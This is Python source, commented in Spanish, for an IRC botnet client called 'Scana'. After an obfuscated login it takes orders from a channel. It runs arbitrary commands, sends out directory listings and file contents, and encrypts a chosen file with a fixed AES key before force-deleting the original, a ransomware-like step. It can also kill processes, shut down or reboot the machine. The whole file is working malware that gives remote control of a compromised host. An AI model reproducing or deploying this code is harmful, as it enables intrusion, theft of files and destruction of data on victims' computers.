import socket
import random, os
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from subprocess import Popen, PIPE, CalledProcessError
 
servidor = "192.168.1.30"
canal = "#canal"
nickName = ""
puerto = 6667

isAuth = False


def Cifra(key, fnamec):
      """
      Recibe: La llave para cifrar el archivo y el nombre del archivo
      Devuelve: Archivo cifrado usando AES como metodo de cifrado
      """
      chunksize=64*1024
      outputfile=fnamec+'.ggez'
      filesize=str(os.path.getsize(fnamec)).zfill(16)
      IV=''
      for i in range(16):
            IV+=chr(random.randint(0,0xff))
      encryptor= AES.new(key, AES.MODE_CBC,IV)

      try:
        with open(fnamec, 'rb') as infile:
                with open(outputfile, 'wb') as outfile:
                    outfile.write(filesize)
                    outfile.write(IV)

                    while True:
                            chunk =infile.read(chunksize)
                            if len(chunk)==0:
                                break
                            elif len(chunk) % 16 !=0:
                                chunk+=' '*(16-(len(chunk)%16))
                            outfile.write(encryptor.encrypt(chunk))
					
			        
                    return "Cifrado exitoso."
      except IOError:
        return "Error de permisos"


def CreaLlave(key):
      """
      Recibe: Un texto plano que servira ser una llave
      Devuelve: Una llave de tamano constante la cual servira para cifrar el archivo
      """
      hasher=SHA256.new(key)
      return hasher.digest()

def name_generator():
      cad= "abcdefghijklmnopqrstuvwxyz1234567890"
      lenght= random.randint(4,10)
      name=[]
      name+=[cad[random.randint(0,len(cad) - 1)] for i in range(0,lenght)]
      return "".join(name)

def send_msg(irc, canal , msg):
      irc.sendall("PRIVMSG "+ canal +" :"+ msg +"\n\r") 
      
def  get_nick(canal, ircmsg):
      if ircmsg.find("PRIVMSG "+canal) != -1:
            nick = ircmsg.split('!', 1 )
            nick = nick[0].replace(":", "",1)
            return nick
      
def get_msg(canal, ircmsg):
      if ircmsg.find("PRIVMSG "+canal) != -1:
            mensaje = ircmsg.split(canal+' ', 1 )
            mensaje = mensaje[1].replace(":", "",1)
      return mensaje

def isBotMaster(passwd):
    '''
        Funcion ofuscada para identificar al usuario.
        compara que el login sea la concatenacion de 'Scana' con el valor de canal
        caracter por caracter empezando con 'Scana'. Tomando solo los primeros 10 caracteres
        ejemplo:
            si canal = '#canal'
            el valor de login debe ser
            S#ccaannaa
    '''
    #usamos la variable global
    global canal
    flag = False
    #La longitud debe ser de 10 caracteres
    if (len(passwd) + 21)**2 != 961:
        return False

    #Comparamos caracter a caracter
    for x in range(10):
        #Caracteres que deben ser iguales a 'Scana'
        if x % 2 == 0:
            if x == 0 and passwd[x] == 'S':
                flag = True
            elif x == 2 and passwd[x] == 'c':
                flag = True
            elif x == 4 and passwd[x] == 'a':
                flag = True
            elif x == 6 and passwd[x] == 'n':
                flag = True
            elif x == 8 and passwd[x] == 'a':
                flag = True
            else:
                flag = False
        #Caracteres que deben ser igual al valor de canal
        else:
            if passwd[x] == canal[x/2]:
                flag = True
            else:
                flag = False

        if not flag:
            return False
            
    return True 

def do_command(irc, ircmsg):
    '''
        Funcion que implementa todos los comandos disponibles para el Bot
        Cuando no se esta autenticado, solo se permiten el comando para
        PING-PONG y el comando de login
    '''
    global isAuth

    #Comando permitidos sin autenticacion
    if not isAuth:
        if ircmsg.find("Hola") != -1:
                send_msg(irc, canal, "Hola!!!")

        elif ircmsg.find("!@login") != -1:
                command_rec = ircmsg.split("!@login ")[1]
                isAuth = isBotMaster(command_rec)
                if isAuth:
                    send_msg(irc, canal, "Bienvenido!")

    #comando permitidos con autenticacion
    else:
        if ircmsg.find("!@exec") != -1:
            command_rec = ircmsg.split("!@exec ")[1]
            command_rec = command_rec.split(" ")
            command_rec.append("&")
            sub_stdout, sub_stderr = Popen(command_rec, stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
            #send_msg(irc, canal, sub_stdout.replace("\r\n", ", "))
            send_msg(irc, canal, "Hecho!")
        
        elif ircmsg.find("!@ls") != -1:
            sub_stdout, sub_stderr = Popen(["ls"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
            send_msg(irc, canal, sub_stdout.replace("\r\n", ", "))
                
        elif ircmsg.find("!@cat") != -1:
            command_rec = ircmsg.split("!@cat ")[1]
            sub_stdout, sub_stderr = Popen(["cat", command_rec], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
            send_msg(irc, canal, sub_stdout)

        elif ircmsg.find("!@pwd") != -1:
            sub_stdout, sub_stderr = Popen(["pwd"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
            send_msg(irc, canal, sub_stdout.replace("\r\n", ""))

        elif ircmsg.find("!@cifraArchivo") != -1:
            command_rec = ircmsg.split("!@cifraArchivo ")[1]
            command_rec = command_rec.split(" ")
            send_msg(irc, canal, "Cifrando...")
            fileA=command_rec[0]
            if os.path.exists(fileA):
                sub_stdout, sub_stderr = Popen(["message.exe"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
                llave = CreaLlave('hola')
                mensaje = Cifra(llave,fileA)
                os.system("del /F /Q /A "+ fileA)
                send_msg(irc, canal, mensaje)
            else:
		        send_msg(irc, canal, "No existe el archivo.")

        
        elif ircmsg.find("!@bye") != -1:
            send_msg(irc, canal, "Me voy a dormir zZ")
            #sub_stdout, sub_stderr = Popen(["taskkill", "/IM", "BotIRCMreboo.exe", "/F"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
            sub_stdout, sub_stderr = Popen(["taskkill", "/IM", "notepad.exe", "/F"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
        
        elif ircmsg.find("!@shutdown") != -1:
            send_msg(irc, canal, "Adios ;)")
            sub_stdout, sub_stderr = Popen(["shutdown", "/s", "/t", "0"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()

        elif ircmsg.find("!@reboot") != -1 :
            send_msg(irc, "Regreso en un minuto, voy al banio :O")
            sub_stdout, sub_stderr = Popen(["shutdown", "/r", "/t", "0"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
      


def Scana_main():
      nickName=name_generator()
      irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      irc.connect((servidor, puerto))
      irc.send("USER "+ nickName +" "+ nickName +" "+ nickName +" :r\n\r")
      irc.send("NICK "+ nickName +"\n\r")
      irc.send("JOIN "+ canal +"\n\r")

      while 1:
            ircmsg = irc.recv(512)
            ircmsg = ircmsg.strip('\n\r')
            do_command(irc, ircmsg)


Scana_main()
